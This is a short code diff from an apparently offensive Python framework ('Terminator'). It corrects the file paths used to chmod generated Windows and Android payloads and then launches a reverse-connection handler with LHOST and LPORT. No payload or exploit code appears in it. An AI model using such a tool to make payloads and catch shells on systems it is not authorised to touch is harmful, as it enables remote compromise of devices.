@@ -214,7 +214,7 @@ Handler Details:
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
                 time.sleep(0.3)
-                os.system('chmod +x payload.exe > /dev/null 2>&1')
+                os.system('chmod +x /root/.tmf/payload.exe > /dev/null 2>&1')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
                 try:
                     os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
@@ -229,7 +229,7 @@ Handler Details:
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
                 time.sleep(0.3)
-                os.system('chmod +x payload.apk > /dev/null 2>&1')
+                os.system('chmod +x /root/.tmf/payload.apk > /dev/null 2>&1')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
                 try:
                     os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
